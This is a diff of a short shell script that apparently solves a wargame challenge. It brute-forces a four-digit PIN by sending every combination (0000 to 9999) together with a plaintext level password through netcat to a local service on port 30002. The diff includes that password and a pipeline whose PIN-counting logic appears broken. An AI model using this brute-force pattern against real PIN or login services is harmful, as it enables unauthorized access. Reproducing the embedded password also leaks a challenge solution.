@@ -1,9 +1,11 @@
+# PINCODE gathering
 # 1
 dir_name=$(mktemp -d)
 cd $dir_name
-# 2: Create a sript to obtain de password of level 15 and retrieve the pin Code.
+# 2: Create file containing the list of messages to be sent
+for pinCode in {0000..9999}; do echo -e "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $pinCode"; done > combinations.txt
+# 3: Create a sript to obtain de password of level 15 and retrieve the pin Code.
 #!/bin/bash 
- 
-WORKING...!
- 
+pin=9999
+tac combinations.txt | nc localhost 30002 | echo -e "PINCODE: $(($pin - $(grep -c "Wrong")))" > a.txt
 cat a.txt
